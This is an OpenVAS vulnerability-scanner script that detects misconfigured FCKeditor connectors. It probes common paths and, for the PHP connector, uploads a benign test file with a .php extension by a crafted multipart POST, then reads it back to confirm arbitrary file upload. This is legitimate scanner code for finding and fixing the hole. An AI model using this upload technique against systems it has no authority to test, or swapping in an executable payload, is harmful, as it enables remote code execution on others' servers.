###############################################################################
# OpenVAS Vulnerability Test
# $Id: sw_fckeditor_file_upload.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# 'fckeditor' Connectors Arbitrary File Upload Vulnerability
#
# Authors:
# Christian Fischer <info@schutzwerk.com>
#
# Copyright:
# Copyright (c) 2015 SCHUTZWERK GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111022");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-07-17 13:24:40 +0200 (Fri, 17 Jul 2015)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("'fckeditor' Connectors Arbitrary File Upload Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 SCHUTZWERK GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.fckeditor.net");

  script_tag(name:"summary", value:"Web applications providing a wrong configured 'fckeditor'
  connectors might be prone to an arbitrary-file-upload vulnerability.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to the
  affected system. This can result in arbitrary code execution within the context of the vulnerable application.");

  script_tag(name:"solution", value:"Check the config.php of this connector and make sure that no arbitrary file
  extensions are allowed for uploading.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_timeout(600);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

asp_files = make_list( "/editor/filemanager/connectors/asp/connector.asp?Command=GetFolders&Type=File&CurrentFolder=%2F",
                       "/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFolders&Type=File&CurrentFolder=%2F" );

php_files = make_list( "/editor/filemanager/connectors/php/connector.php?Command=GetFolders&Type=File&CurrentFolder=%2F" );

files = make_list( "/editor/filemanager/connectors/cfm/connector.cfm?Command=GetFolders&Type=File&CurrentFolder=%2F",
                   "/editor/filemanager/connectors/lasso/connector.lasso?Command=GetFolders&Type=File&CurrentFolder=%2F",
                   "/editor/filemanager/connectors/perl/connector.cgi?Command=GetFolders&Type=File&CurrentFolder=%2F",
                   "/editor/filemanager/connectors/py/connector.py?Command=GetFolders&Type=File&CurrentFolder=%2F" );

port = get_http_port( default:80 );

# Choose file to request based on what the remote host is supporting
if( can_host_asp( port:port ) && can_host_php( port:port ) ) {
  files = make_list( files, asp_files, php_files );
} else if( can_host_asp( port:port ) ) {
  files = make_list( files, asp_files );
} else if( can_host_php( port:port ) ) {
  files = make_list( files, php_files );
}

dirs = make_list_unique( "/", "/fckeditor", "/FCKeditor", "/inc/fckeditor", "/includes/fckeditor", "/include/fckeditor",
                         "/modules/fckeditor", "/plugins/fckeditor", "/admin/fckeditor", "/HTMLEditor", "/admin/htmleditor",
                         "/sites/all/modules/fckeditor/fckeditor", cgi_dirs( port:port ) );

useragent = http_get_user_agent();

foreach dir( dirs ) {

  if( dir == "/" ) dir = "";

  foreach file( files ) {

    url = string( dir, file );

    if( "connector.php" >< url ) {

      req = http_get( item:url, port:port );
      recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

      if( '<Connector command="GetFolders" resourceType="File">' >< recv ) {

        host = http_host_name( port:port );
        upload_file = string( "upload-test-delete-me-" , rand() , ".php" );

        url = dir + "/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F";

        req = string("POST ", url, " HTTP/1.1\r\n",
                     "Host: ", host ,"\r\n",
                     "User-Agent: ", useragent, "\r\n",
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                     "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                     "Accept-Encoding: gzip, deflate\r\n",
                     "Connection: keep-alive\r\n",
                     "Referer: http://",host,dir,"/editor/filemanager/connectors/test.html\r\n",
                     "Content-Type: multipart/form-data; boundary=---------------------------1179981022663023650735134601\r\n",
                     "Content-Length: 275\r\n",
                     "\r\n",
                     "-----------------------------1179981022663023650735134601\r\n",
                     'Content-Disposition: form-data; name="NewFile"; filename="',upload_file,'"\r\n',
                     "Content-Type: text/plain\r\n",
                     "\r\n",
                     "Upload-Test\r\n",
                     "-----------------------------1179981022663023650735134601--\r\n",
                     "\r\n\r\n");
        recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

        if( "OnUploadCompleted(0" >< recv && upload_file >< recv ) {

          file_location = eregmatch( pattern : '0,"(.*)' + upload_file + '","' + upload_file + '"', string : recv );

          url = string( file_location[1] , upload_file );
          req2 = http_get( item:url, port:port );
          recv = http_keepalive_send_recv( data:req2, port:port, bodyonly:TRUE );

          if( "Upload-Test" >< recv ) {
            report = 'It was possible to upload the file:\n\n' +
                     file_location[1] + upload_file +
                     '\n\nby using the connector:\n\n' +
                     dir + file +
                     '\n\nPlease delete this uploaded file.';
            security_message( port:port, data:report );
            exit( 0 );
          } else {
            report = 'It was possible to detect a connector at:\n\n' + dir + file;
            security_message( port:port, data:report );
            exit( 0 );
          }
        } else {
          report = 'It was possible to detect a connector at:\n\n' + dir + file;
          security_message( port:port, data:report );
          exit( 0 );
        }
      }
    } else {
        req = http_get( item:url, port:port );
        recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

        if( '<Connector command="GetFolders" resourceType="File">' >< recv ) {
          report = 'It was possible to detect a connector at:\n\n' + dir + file;
          security_message( port:port, data:report );
          exit( 0 );
        }
      }
   }
}

exit( 99 );
